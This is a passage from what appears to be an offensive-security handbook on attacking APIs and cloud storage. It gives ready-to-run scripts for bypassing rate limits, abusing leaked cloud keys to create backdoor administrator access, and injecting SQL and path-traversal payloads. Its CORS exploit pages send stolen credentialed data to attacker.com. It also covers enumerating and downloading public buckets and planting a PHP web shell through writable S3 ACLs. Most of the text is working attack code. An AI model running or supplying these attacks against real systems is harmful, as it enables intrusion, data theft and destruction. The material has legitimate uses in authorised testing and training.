query += "}"

print(query)
EOF
```

**Batch Query Bypass**

```bash
# Array of queries in single HTTP request
python3 << 'EOF'
import json

queries = []
for i in range(1, 101):
    queries.append({
        "query": f"{{ user(id: {i}) {{ id name email }} }}"
    })

print(json.dumps(queries))
EOF

# Execute batch
curl -X POST https://api.target.com/graphql \
     -H "Content-Type: application/json" \
     -d @batch_queries.json
```

### Time-Based Bypass

**Request Timing**

```bash
# Identify rate limit window (e.g., 100 requests per minute)
# Stay just under threshold
#!/bin/bash
requests_per_window=99
window_seconds=60
delay=$(echo "scale=2; $window_seconds / $requests_per_window" | bc)

for i in {1..10000}; do
    curl https://api.target.com/endpoint
    sleep $delay
done
```

**Reset Time Exploitation**

```bash
# Monitor rate limit reset header
reset_time=$(curl -I https://api.target.com/endpoint | \
             grep -i "X-RateLimit-Reset" | \
             awk '{print $2}')

current_time=$(date +%s)
sleep_duration=$((reset_time - current_time + 1))

echo "Sleeping for $sleep_duration seconds"
sleep $sleep_duration

# Resume requests
curl https://api.target.com/endpoint
```

### Connection Reuse

**HTTP Keep-Alive**

```bash
# Some rate limiters count connections instead of requests
# Reuse connection for multiple requests

curl --keepalive-time 60 \
     https://api.target.com/endpoint1 \
     https://api.target.com/endpoint2 \
     https://api.target.com/endpoint3
```

**HTTP Pipelining**

[Unverified] HTTP pipelining allows multiple requests on single connection, potentially bypassing connection-based rate limits on servers that support it:

```bash
# Pipelining with netcat
(echo -ne "GET /endpoint HTTP/1.1\r\nHost: api.target.com\r\n\r\n";
 echo -ne "GET /endpoint HTTP/1.1\r\nHost: api.target.com\r\n\r\n";
 echo -ne "GET /endpoint HTTP/1.1\r\nHost: api.target.com\r\n\r\n") | \
nc api.target.com 443
```

### Distributed Request Bypass

**Parallel Processing**

```bash
# GNU Parallel for distributed requests
parallel -j 50 curl -s https://api.target.com/endpoint ::: {1..1000}

# With different IPs using proxies
parallel -j 20 \
    'curl -x proxy{}.provider.com:8080 https://api.target.com/endpoint' \
    ::: {1..100}
```

**Multi-Threading with Python**

```python
#!/usr/bin/env python3
import requests
import threading
import queue

def worker(q, results):
    while True:
        try:
            url = q.get(timeout=1)
            response = requests.get(url, 
                headers={"X-Forwarded-For": f"10.0.{threading.get_ident() % 255}.1"})
            results.append(response.status_code)
            q.task_done()
        except queue.Empty:
            break

# Setup
url = "https://api.target.com/endpoint"
q = queue.Queue()
results = []

# Queue 1000 requests
for i in range(1000):
    q.put(url)

# Spawn 50 worker threads
threads = []
for i in range(50):
    t = threading.Thread(target=worker, args=(q, results))
    t.start()
    threads.append(t)

# Wait for completion
for t in threads:
    t.join()

print(f"Completed: {len(results)} requests")
print(f"Success: {results.count(200)}")
print(f"Rate limited: {results.count(429)}")
```

### Cache Poisoning for Rate Limit Bypass

**Cache Key Manipulation**

```bash
# Standard request (cached)
curl https://api.target.com/endpoint

# Manipulate cache key with query parameters
curl "https://api.target.com/endpoint?random=123"
curl "https://api.target.com/endpoint?cb=456"
curl "https://api.target.com/endpoint?_=789"

# Each different parameter may bypass cache-based rate limiting
for i in {1..1000}; do
    curl "https://api.target.com/endpoint?cache_bust=$RANDOM"
done
```

**Header-Based Cache Variation**

```bash
# Vary caching headers
curl -H "Accept: application/json" https://api.target.com/endpoint
curl -H "Accept: application/xml" https://api.target.com/endpoint
curl -H "Accept: text/html" https://api.target.com/endpoint

# Accept-Language variations
for lang in en es fr de it; do
    curl -H "Accept-Language: $lang" https://api.target.com/endpoint
done
```

### Automated Rate Limit Testing Tools

**Burp Suite Turbo Intruder**

```python
# Turbo Intruder script for rate limit testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(1000):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '429' in req.response:
        table.add(req)
```

**Custom Rate Limit Tester**

```bash
#!/bin/bash
# rate_limit_test.sh

URL="https://api.target.com/endpoint"
REQUESTS=1000
CONCURRENT=50

echo "Testing rate limits on $URL"
echo "Requests: $REQUESTS, Concurrent: $CONCURRENT"

# Test 1: Rapid sequential requests
echo -e "\n[*] Test 1: Sequential requests"
for i in $(seq 1 $REQUESTS); do
    http_code=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
    echo -n "."
    [ "$http_code" == "429" ] && echo -e "\n[!] Rate limited at request $i" && break
done

# Test 2: Parallel requests
echo -e "\n[*] Test 2: Parallel requests"
seq 1 $REQUESTS | xargs -P $CONCURRENT -I {} \
    curl -s -o /dev/null -w "%{http_code}\n" "$URL" | \
    sort | uniq -c

# Test 3: IP rotation
echo -e "\n[*] Test 3: IP rotation with X-Forwarded-For"
for i in $(seq 1 100); do
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "X-Forwarded-For: 10.0.0.$((i % 254 + 1))" "$URL")
    echo -n "."
    [ "$http_code" == "429" ] && echo -e "\n[!] Rate limited at request $i" && break
done

echo -e "\n[*] Testing complete"
```

### WebSocket Rate Limit Bypass

[Inference] WebSocket connections may be subject to different rate limiting rules than HTTP REST endpoints:

```bash
# Install wscat
npm install -g wscat

# Connect to WebSocket endpoint
wscat -c wss://api.target.com/ws

# Send rapid messages
for i in {1..1000}; do
    echo "{\"action\":\"getData\",\"id\":$i}"
    sleep 0.01
done | wscat -c wss://api.target.com/ws
```

**Python WebSocket Flood**

```python
#!/usr/bin/env python3
import asyncio
import websockets

async def flood():
    uri = "wss://api.target.com/ws"
    async with websockets.connect(uri) as websocket:
        for i in range(1000):
            await websocket.send(f'{{"action":"getData","id":{i}}}')
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=0.1)
                print(f"Response {i}: {response[:50]}")
            except asyncio.TimeoutError:
                continue

asyncio.run(flood())
```

---

## Related Important Topics

For comprehensive API security testing, consider exploring:

- **SSRF (Server-Side Request Forgery) in APIs** - Exploiting APIs to make internal requests
- **XXE (XML External Entity) in API endpoints** - When APIs accept XML input
- **API versioning vulnerabilities** - Exploiting deprecated API versions
- **Microservices enumeration** - Discovering internal service APIs
- **API Gateway bypass techniques** - Circumventing API gateway protections
- **CORS misconfiguration exploitation** - Cross-origin resource sharing attacks
- **API file upload vulnerabilities** - Exploiting file handling in APIs

---

## API Key Exposure

### Detection and Enumeration

**Public Repositories and Code Leakage**

```bash
# GitHub dorking for exposed keys
# Via GitHub web interface (Advanced Search)
org:target-org "api_key"
org:target-org "apikey"
org:target-org extension:json "aws_access_key_id"
org:target-org extension:env "SECRET"

# TruffleHog for secret scanning
trufflehog git https://github.com/target/repo --only-verified
trufflehog git https://github.com/target/repo --json > findings.json

# GitLeaks
gitleaks detect --source /path/to/repo --verbose
gitleaks detect --source . --log-opts="--all"

# Detect in commit history
git log -p | grep -i "api.key\|apikey\|api_key" -C 5
```

**Client-Side Exposure**

```bash
# Burp Suite: Proxy → HTTP History → Search for patterns
# Regex patterns in responses:
[a-zA-Z0-9_-]{32,}     # Generic API keys
AKIA[0-9A-Z]{16}       # AWS Access Keys
AIza[0-9A-Za-z_-]{35}  # Google API Keys
sk-[a-zA-Z0-9]{48}     # OpenAI API Keys
ghp_[a-zA-Z0-9]{36}    # GitHub Personal Access Tokens

# Extract from JavaScript files
wget -r -l2 https://target.com
grep -r "api[_-]key\|apikey\|access[_-]token" . --include="*.js"

# Automated JS analysis
python3 LinkFinder.py -i https://target.com/app.js -o results.html
```

**Environment and Configuration Files**

```bash
# Common exposure locations
/.env
/.env.production
/.env.local
/config.json
/config.yaml
/application.properties
/appsettings.json
/.aws/credentials
/.azure/credentials

# Directory fuzzing for configs
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://target.com/FUZZ \
  -mc 200,403

# Check S3 buckets
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/.env . --no-sign-request
```

### Validation and Testing

**Key Validation Testing**

```bash
# AWS key validation
aws sts get-caller-identity --profile compromised
aws iam list-users --profile compromised
aws s3 ls --profile compromised

# Enumerate AWS permissions
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# Google Cloud key validation
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29..."

# Azure key validation
az login --service-principal -u <app-id> -p <key> --tenant <tenant-id>
az account list
```

**API Key Scope Testing**

```bash
# Test key with increasing privilege operations
curl -H "X-API-Key: compromised_key" https://api.target.com/v1/users/me
curl -H "X-API-Key: compromised_key" https://api.target.com/v1/users
curl -H "X-API-Key: compromised_key" https://api.target.com/v1/admin/users

# Rate limit testing
for i in {1..1000}; do
  curl -H "X-API-Key: key" https://api.target.com/endpoint &
done

# Test key rotation/expiration
# Record timestamp, test at intervals to determine validity window
```

### Exploitation Patterns

**Privilege Escalation via Exposed Keys**

```bash
# AWS: Assume roles with compromised credentials
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole \
  --role-session-name test --profile compromised

# Create backdoor access
aws iam create-access-key --user-name target-user --profile compromised
aws iam attach-user-policy --user-name target-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile compromised
```

## Swagger/OpenAPI Reconnaissance

### Discovery

**Swagger UI Location Enumeration**

```bash
# Common Swagger paths
/swagger/
/swagger-ui/
/swagger-ui.html
/api/swagger-ui/
/api-docs
/api/docs
/v1/swagger
/v2/swagger
/v3/swagger
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api/swagger.json

# Automated discovery
ffuf -w swagger-paths.txt -u https://target.com/FUZZ -mc 200,301,302

# Wayback Machine for historical endpoints
waybackurls target.com | grep -i swagger
```

**Swagger Specification Extraction**

```bash
# Download specifications
curl https://target.com/swagger.json -o swagger.json
curl https://target.com/v2/api-docs -o openapi.json

# Parse and extract endpoints
jq -r '.paths | keys[]' swagger.json

# Extract all HTTP methods per endpoint
jq -r '.paths | to_entries[] | 
  .key as $path | .value | keys[] as $method | 
  "\($method) \($path)"' swagger.json
```

### Analysis

**Parameter Enumeration**

```bash
# Extract all parameters with types
jq -r '.paths[][].parameters[]? | 
  "\(.name) (\(.in)) - Type: \(.type // .schema.type)"' swagger.json

# Identify authentication requirements
jq -r '.paths[][] | select(.security) | .security' swagger.json

# Find endpoints without authentication
jq -r '.paths | to_entries[] | 
  select(.value[].security == null or .value[].security == []) | 
  .key' swagger.json
```

**Automated Request Generation**

```bash
# swagger-codegen to generate API client
swagger-codegen generate -i swagger.json -l python -o ./client

# Arjun for parameter discovery (complements Swagger)
arjun -u https://target.com/api/v1/user -m GET

# SwaggerEZ for testing
python3 swaggerez.py -u https://target.com/swagger.json
```

### Exploitation

**Undocumented Endpoint Discovery**

```bash
# Version path manipulation
# If /api/v2/users is documented, test:
/api/v1/users
/api/v3/users
/api/internal/users
/api/admin/users
/api/debug/users

# HTTP method enumeration on documented endpoints
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  curl -X $method https://target.com/api/v1/resource -v 2>&1 | grep "HTTP/"
done
```

**Parameter Injection via Swagger Schema**

```bash
# If Swagger shows limited parameters, test additional:
# Documented: GET /api/users?id=123
# Test: GET /api/users?id=123&role=admin
# Test: GET /api/users?id=123&isAdmin=true
# Test: GET /api/users?id=123&__proto__[admin]=true

# Mass assignment via undocumented fields
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","isAdmin":true,"role":"admin"}'
```

**Schema Manipulation**

```bash
# Type confusion attacks
# If schema defines integer, test:
{"id": "1' OR '1'='1"}
{"id": ["1", "2"]}
{"id": {"$ne": null}}

# Array injection when single value expected
{"user_id": [1, 2, 3]}  # Potential IDOR enumeration
```

## API Versioning Exploitation

### Version Discovery

**Endpoint Version Enumeration**

```bash
# URL path versioning
/api/v1/resource
/api/v2/resource
/api/v3/resource
/v1/api/resource
/api/1.0/resource
/api/2023-01-01/resource

# Automated fuzzing
seq 1 10 | while read v; do
  curl -s -o /dev/null -w "%{http_code} - v$v\n" \
    https://target.com/api/v$v/users
done

# Header-based versioning
curl -H "API-Version: 1" https://target.com/api/users
curl -H "Accept: application/vnd.company.v1+json" https://target.com/api/users
curl -H "X-API-Version: 2.0" https://target.com/api/users

# Query parameter versioning
https://target.com/api/users?version=1
https://target.com/api/users?v=2
https://target.com/api/users?api_version=3
```

**Version Feature Comparison**

```bash
# Compare responses across versions
diff <(curl -s https://target.com/api/v1/users/1) \
     <(curl -s https://target.com/api/v2/users/1)

# Automated comparison script
for v in {1..5}; do
  echo "=== Version $v ===" >> version_comparison.txt
  curl -s https://target.com/api/v$v/users/1 >> version_comparison.txt
done
```

### Exploitation Techniques

**Deprecated Version Abuse**

```bash
# Older versions often lack security controls implemented in newer versions

# v1: No rate limiting
curl -X POST https://target.com/api/v1/login \
  -d "username=admin&password=test" -v
# Brute force viable on v1 but not v3

# v1: Weak authentication
# v3 requires JWT, v1 accepts simple API key
curl -H "X-API-Key: leaked_key" https://target.com/api/v1/admin/users

# v1: No input validation
curl https://target.com/api/v1/users?id=1' OR '1'='1
# SQLi successful on v1, parameterized in v3
```

**Version Confusion Attacks**

```bash
# Mixed version headers
curl -H "API-Version: 1" https://target.com/api/v3/users
# Server may process v1 logic with v3 endpoint

# Version downgrade in multi-step operations
# Step 1: Create resource in v3 (with validation)
# Step 2: Update via v1 (without validation)
curl -X POST https://target.com/api/v3/users \
  -d '{"name":"test","email":"test@test.com"}'
# Returns: {"id": 123}
curl -X PUT https://target.com/api/v1/users/123 \
  -d '{"name":"admin","role":"superadmin"}'
```

**Authorization Bypass via Version Mismatch**

```bash
# Scenario: v3 enforces RBAC, v2 does not
# Create resource in v3 as regular user
# Access resource in v2 with elevated permissions

# v3: Proper authorization check
curl -H "Authorization: Bearer user_token" \
  https://target.com/api/v3/admin/settings
# Returns: 403 Forbidden

# v2: Missing authorization check
curl -H "Authorization: Bearer user_token" \
  https://target.com/api/v2/admin/settings
# Returns: 200 OK with sensitive data
```

### Version-Specific Fuzzing

**Differential Testing**

```bash
# Payload testing across versions
payloads="' OR '1'='1
<script>alert(1)</script>
../../../etc/passwd
${7*7}
{{7*7}}"

echo "$payloads" | while read payload; do
  for v in {1..3}; do
    response=$(curl -s "https://target.com/api/v$v/search?q=$payload")
    echo "v$v - $payload: $response" >> version_fuzzing.txt
  done
done
```

## CORS Misconfiguration

### Detection

**Basic CORS Testing**

```bash
# Test for reflected origin
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: X-Requested-With" \
  -X OPTIONS https://target.com/api/data -v

# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  [VULNERABLE]
# Access-Control-Allow-Credentials: true         [CRITICAL IF COMBINED]

# Automated CORS testing
python3 corsy.py -u https://target.com/api/endpoint

# CORScanner
python3 cors_scan.py -u https://target.com -t 10
```

**Common Misconfigurations**

```bash
# Wildcard with credentials (impossible but misconfigured proxies may allow)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Null origin acceptance
curl -H "Origin: null" https://target.com/api/data -v
# If returns: Access-Control-Allow-Origin: null [VULNERABLE]

# Subdomain wildcard bypass
curl -H "Origin: https://evil.target.com" https://target.com/api/data -v
curl -H "Origin: https://targetXevil.com" https://target.com/api/data -v
curl -H "Origin: https://target.com.evil.com" https://target.com/api/data -v

# Regex bypass attempts
curl -H "Origin: https://evil.com?target.com" https://target.com/api/data -v
curl -H "Origin: https://target.com@evil.com" https://target.com/api/data -v
```

**Pre-flight Request Analysis**

```bash
# OPTIONS request inspection
curl -X OPTIONS https://target.com/api/endpoint \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: Authorization, X-Custom-Header" \
  -v

# Analyze allowed methods
# Access-Control-Allow-Methods: GET, POST, DELETE, PUT
# If DELETE allowed without proper validation = potential data deletion

# Analyze allowed headers
# Access-Control-Allow-Headers: Authorization, X-Custom-Header
# Custom headers may indicate additional attack surface
```

### Exploitation

**Credential Theft via CORS**

HTML Exploit Template:

```html
<!-- Served from https://attacker.com/cors-exploit.html -->
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
<script>
// Target vulnerable endpoint
const targetUrl = 'https://target.com/api/user/profile';

fetch(targetUrl, {
  method: 'GET',
  credentials: 'include',  // Include cookies
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  }
})
.then(response => response.json())
.then(data => {
  // Exfiltrate data
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify(data)
  });
})
.catch(error => console.error('Error:', error));
</script>
<p>Loading content...</p>
</body>
</html>
```

**State-Changing Operations**

```html
<!-- CORS exploit for DELETE operation -->
<script>
fetch('https://target.com/api/users/123', {
  method: 'DELETE',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  }
})
.then(response => response.text())
.then(result => {
  console.log('User deleted:', result);
  // Log success to attacker server
  navigator.sendBeacon('https://attacker.com/success', 
    JSON.stringify({deleted: true}));
});
</script>
```

**Null Origin Exploitation**

```html
<!-- Exploit when null origin is allowed -->
<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/sensitive', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  // Data exfiltration
  parent.postMessage(data, '*');
});
</script>
"></iframe>

<script>
window.addEventListener('message', event => {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: event.data
  });
});
</script>
</body>
</html>
```

### Advanced Testing

**CORS Chain Attacks**

```bash
# Scenario: subdomain.target.com has XSS, main domain has CORS misconfiguration

# Step 1: XSS on subdomain.target.com
https://subdomain.target.com/search?q=<script>/* payload */</script>

# Step 2: Exploit CORS from subdomain context
# Since Origin: https://subdomain.target.com is allowed by target.com
# XSS executes fetch to main domain with credentials

# Combined payload:
<script>
fetch('https://target.com/api/admin/users', {
  credentials: 'include'
})
.then(r => r.json())
.then(users => {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify(users)
  });
});
</script>
```

**WebSocket CORS Testing**

```javascript
// WebSocket connections also subject to Origin checks
const ws = new WebSocket('wss://target.com/api/ws');

ws.onopen = function() {
  ws.send(JSON.stringify({action: 'getSecret'}));
};

ws.onmessage = function(event) {
  // Exfiltrate WebSocket data
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: event.data
  });
};
```

**PostMessage CORS Bypass**

```javascript
// If target uses postMessage without origin validation
window.addEventListener('message', function(event) {
  // Target fails to check event.origin
  if (event.data.action === 'getData') {
    fetch('https://target.com/api/data', {credentials: 'include'})
      .then(r => r.json())
      .then(data => event.source.postMessage(data, '*'));
  }
});

// Attacker exploitation:
const popup = window.open('https://target.com');
setTimeout(() => {
  popup.postMessage({action: 'getData'}, '*');
}, 2000);

window.addEventListener('message', event => {
  console.log('Stolen data:', event.data);
});
```

### Remediation Testing

**Verify Proper CORS Configuration** [Inference]

```bash
# Strict origin whitelist
curl -H "Origin: https://evil.com" https://target.com/api/data -v
# Should NOT return: Access-Control-Allow-Origin: https://evil.com

# Credentials properly restricted
curl -H "Origin: https://trusted.com" https://target.com/api/data -v
# If credentials needed, origin should be explicit, never "*"

# Pre-flight properly enforced
curl -X DELETE https://target.com/api/resource \
  -H "Origin: https://evil.com" -v
# Should return 403/405 without valid pre-flight
```

---

**Important Subtopics:**

- **OAuth/JWT vulnerabilities in cloud APIs** (token manipulation, algorithm confusion)
- **GraphQL API testing** (introspection, batching attacks, nested queries)
- **API rate limiting bypass techniques** (header manipulation, distributed attacks)
- **Server-Side Request Forgery (SSRF) via cloud APIs** (metadata service exploitation)

---

# Cloud Storage Exploitation

## Public Bucket Discovery

### AWS S3 Bucket Enumeration

**DNS-Based Discovery**

```bash
# S3 bucket naming patterns
# Format: bucketname.s3.amazonaws.com or s3.amazonaws.com/bucketname

# Common naming conventions to test
company-name
company-backup
company-data
company-dev
company-prod
company-assets
company-logs
company-public
company-private
companyname-backup
companyname-{env}

# DNS resolution testing
host target-company.s3.amazonaws.com
host target-company-backup.s3.amazonaws.com

# Automated DNS enumeration
cat > bucket-names.txt <<'EOF'
{company}
{company}-backup
{company}-backups
{company}-data
{company}-dev
{company}-development
{company}-prod
{company}-production
{company}-stage
{company}-staging
{company}-test
{company}-assets
{company}-images
{company}-files
{company}-uploads
{company}-logs
{company}-archive
{company}-public
{company}-private
EOF

# Replace {company} and test
company="target"
sed "s/{company}/$company/g" bucket-names.txt | while read bucket; do
  if host "$bucket.s3.amazonaws.com" > /dev/null 2>&1; then
    echo "[+] Found: $bucket"
  fi
done
```

**Direct S3 Access Testing**

```bash
# Test bucket existence and permissions
test_bucket() {
  bucket=$1
  
  # Test bucket existence (403 = exists but private, 404 = doesn't exist)
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/")
  
  if [ "$response" = "200" ]; then
    echo "[+] $bucket - PUBLIC (ListBucket allowed)"
  elif [ "$response" = "403" ]; then
    echo "[*] $bucket - EXISTS (ListBucket denied)"
  elif [ "$response" = "404" ]; then
    echo "[-] $bucket - NOT FOUND"
  fi
}

# Test multiple buckets
cat bucket-names.txt | while read bucket; do
  test_bucket "$bucket"
done

# AWS CLI testing (no credentials needed for public buckets)
aws s3 ls s3://target-company --no-sign-request

# List all objects
aws s3 ls s3://target-company --recursive --no-sign-request

# Download specific file
aws s3 cp s3://target-company/backup.zip . --no-sign-request

# Sync entire bucket
aws s3 sync s3://target-company ./local-copy --no-sign-request
```

**Automated S3 Scanner Tools**

```bash
# S3Scanner
python3 s3scanner.py --bucket-file bucket-names.txt
python3 s3scanner.py --bucket target-company

# Bucket findings output
# OPEN - ListBucket allowed, readable
# OPEN - Upload allowed (dangerous)
# FORBIDDEN - Exists but no access
# NOT FOUND - Doesn't exist

# slurp (more aggressive)
slurp domain -t target.com
slurp keyword -t target-company

# S3Inspector
python3 s3inspector.py --bucket target-company
python3 s3inspector.py --bucket-file buckets.txt --dump

# AWSBucketDump
python3 AWSBucketDump.py -l bucket-names.txt -g interesting-keywords.txt

# Lazy-S3
ruby lazy_s3.rb target.com
```

**Content-Based Discovery**

```bash
# Google dorking for S3 buckets
site:s3.amazonaws.com "target-company"
site:s3.amazonaws.com intitle:"Index of /" "target"
site:.s3.amazonaws.com ext:xml
site:.s3.amazonaws.com inurl:".s3.amazonaws.com"

# GitHub reconnaissance for S3 references
org:target-org "s3.amazonaws.com"
org:target-org "s3://"
org:target-org ".s3.amazonaws.com"
user:target-user "amazonaws.com"

# Extract S3 URLs from web applications
wget -r -l2 https://target.com
grep -r "s3.amazonaws.com" . -h | grep -oP 'https://[^"]+\.s3\.amazonaws\.com[^"]*' | sort -u

# JavaScript file analysis for S3 references
curl -s https://target.com/app.js | grep -oP 's3://[^"]+|https://[^"]*\.s3\.amazonaws\.com[^"]*'
```

**Certificate Transparency Logs**

```bash
# Search CT logs for S3 subdomains
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | grep s3

# Automated CT log enumeration
subfinder -d target.com | grep s3
amass enum -d target.com | grep s3
```

### Azure Blob Storage Discovery

**Azure Storage Account Enumeration**

```bash
# Azure storage URL formats:
# https://{account}.blob.core.windows.net
# https://{account}.file.core.windows.net
# https://{account}.table.core.windows.net
# https://{account}.queue.core.windows.net

# Common naming patterns
targetcompany
targetcompanystorage
targetcompanydata
targetcompanybackup
targetcompanysa
targetstorageacct
targetsa

# Test storage account existence
test_azure_storage() {
  account=$1
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$account.blob.core.windows.net/")
  
  if [ "$response" = "400" ] || [ "$response" = "409" ]; then
    echo "[+] $account - EXISTS"
  elif [ "$response" = "404" ]; then
    echo "[-] $account - NOT FOUND"
  fi
}

# Enumerate containers
az storage container list --account-name targetcompany --output table

# List blobs without authentication (if public)
az storage blob list --account-name targetcompany --container-name public --output table

# Using Azure CLI without auth
az storage blob list --account-name targetcompany --container-name backups --auth-mode login 2>/dev/null
```

**MicroBurst (Azure Enumeration Framework)**

```powershell
# Import MicroBurst
Import-Module MicroBurst.psm1

# Enumerate storage accounts
Invoke-EnumerateAzureBlobs -Base target

# Check for public containers
Invoke-EnumerateAzureBlobs -Base company -Verbose

# Common container names tested:
# backups, backup, data, files, images, uploads, public, private, archive, logs
```

**Manual Azure Container Testing**

```bash
# Test common container names
containers="backup backups data files images uploads public private logs archive web assets"
account="targetcompany"

for container in $containers; do
  url="https://$account.blob.core.windows.net/$container?restype=container&comp=list"
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  
  if [ "$response" = "200" ]; then
    echo "[+] $account/$container - PUBLIC"
    curl -s "$url" | grep -oP '(?<=<Name>)[^<]+' | head -10
  elif [ "$response" = "403" ]; then
    echo "[*] $account/$container - EXISTS (private)"
  fi
done

# Download public blob
curl "https://targetcompany.blob.core.windows.net/backups/database.bak" -o database.bak

# List all blobs in public container
curl -s "https://targetcompany.blob.core.windows.net/public?restype=container&comp=list" | \
  grep -oP '(?<=<Name>)[^<]+' | while read blob; do
    echo "https://targetcompany.blob.core.windows.net/public/$blob"
  done
```

### Google Cloud Storage (GCS) Discovery

**GCS Bucket Enumeration**

```bash
# GCS URL formats:
# https://storage.googleapis.com/{bucket}/{object}
# https://{bucket}.storage.googleapis.com/{object}
# gs://{bucket}/{object}

# Test bucket existence
test_gcs_bucket() {
  bucket=$1
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/$bucket/")
  
  if [ "$response" = "200" ]; then
    echo "[+] $bucket - PUBLIC"
  elif [ "$response" = "403" ]; then
    echo "[*] $bucket - EXISTS (private)"
  elif [ "$response" = "404" ]; then
    echo "[-] $bucket - NOT FOUND"
  fi
}

# List bucket contents (if public)
curl -s "https://storage.googleapis.com/storage/v1/b/target-bucket/o" | jq -r '.items[].name'

# Using gsutil without authentication
gsutil ls gs://target-bucket

# Download file
gsutil cp gs://target-bucket/sensitive-file.txt .

# Sync entire bucket
gsutil -m rsync -r gs://target-bucket ./local-copy
```

**GCPBucketBrute**

```bash
# Automated GCS enumeration
python3 gcpbucketbrute.py -k target-keywords.txt

# Common keywords
echo -e "target\ntarget-backup\ntarget-data\ntarget-prod" > keywords.txt
python3 gcpbucketbrute.py -k keywords.txt -o results.txt
```

**Google Cloud API Enumeration**

```bash
# List buckets in project (requires authentication)
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID"

# Get bucket metadata
curl "https://storage.googleapis.com/storage/v1/b/target-bucket"

# Check IAM policy
curl "https://storage.googleapis.com/storage/v1/b/target-bucket/iam"
```

### Multi-Cloud Bucket Monitoring

**cloud_enum (Multi-Cloud Enumeration)**

```bash
# Install cloud_enum
git clone https://github.com/initstring/cloud_enum
cd cloud_enum

# Enumerate across AWS, Azure, GCP
python3 cloud_enum.py -k target-company

# Output shows:
# - S3 buckets found
# - Azure storage accounts found  
# - GCS buckets found
# - Open vs. forbidden vs. not found

# With keyword file
python3 cloud_enum.py -kf keywords.txt -l logfile.txt
```

**CloudBrute**

```bash
# Multi-cloud brute forcing
cloudbrute -d target.com -w wordlist.txt

# Supports:
# - AWS S3
# - Azure Blob Storage
# - GCS
# - DigitalOcean Spaces
```

## ACL Misconfiguration

### AWS S3 ACL Exploitation

**Understanding S3 ACLs and Permissions**

```bash
# ACL Grantees:
# - AuthenticatedUsers (any AWS user)
# - AllUsers (public internet)
# - Specific AWS accounts

# Permissions:
# READ - List objects
# WRITE - Upload/delete objects
# READ_ACP - Read ACL
# WRITE_ACP - Modify ACL
# FULL_CONTROL - All permissions

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Example vulnerable ACL:
{
  "Grants": [
    {
      "Grantee": {
        "Type": "Group",
        "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
      },
      "Permission": "READ"
    },
    {
      "Grantee": {
        "Type": "Group", 
        "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
      },
      "Permission": "WRITE"
    }
  ]
}
```

**Exploiting WRITE Permission**

```bash
# If AuthenticatedUsers or AllUsers has WRITE permission:

# Create AWS account (free tier)
aws configure
# Use any valid AWS credentials

# Upload malicious file
echo "Malicious content" > malware.exe
aws s3 cp malware.exe s3://target-bucket/malware.exe

# Upload web shell to web-served bucket
cat > shell.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
aws s3 cp shell.php s3://target-website-bucket/shell.php

# Access via: https://target-bucket.s3.amazonaws.com/shell.php?cmd=whoami

# Overwrite existing files (if allowed)
aws s3 cp malicious.html s3://target-bucket/index.html

# Delete objects (if WRITE includes DELETE)
aws s3 rm s3://target-bucket/important-file.pdf
```

**Exploiting READ_ACP Permission** [Inference - allows reading ACL to discover other misconfigurations]

```bash
# Read bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Read object ACL
aws s3api get-object-acl --bucket target-bucket --key sensitive-file.txt

# Enumerate all object ACLs
aws s3 ls s3://target-bucket --recursive | awk '{print $NF}' | while read obj; do
  echo "=== $obj ==="
  aws s3api get-object-acl --bucket target-bucket --key "$obj"
done
```

**Exploiting WRITE_ACP Permission**

```bash
# WRITE_ACP allows modifying ACLs - escalate to FULL_CONTROL

# Grant yourself FULL_CONTROL
aws s3api put-bucket-acl \
  --bucket target-bucket \
  --grant-full-control emailaddress=attacker@example.com

# Alternative: Make bucket public
aws s3api put-bucket-acl \
  --bucket target-bucket \
  --acl public-read-write

# Grant FULL_CONTROL on specific object
aws s3api put-object-acl \
  --bucket target-bucket \
  --key sensitive-data.txt \
  --grant-full-control emailaddress=attacker@example.com

# Verify new permissions
aws s3api get-bucket-acl --bucket target-bucket
```

**Bucket Policy vs ACL Conflicts** [Inference - bucket policies take precedence over ACLs]

```bash
# Check bucket policy
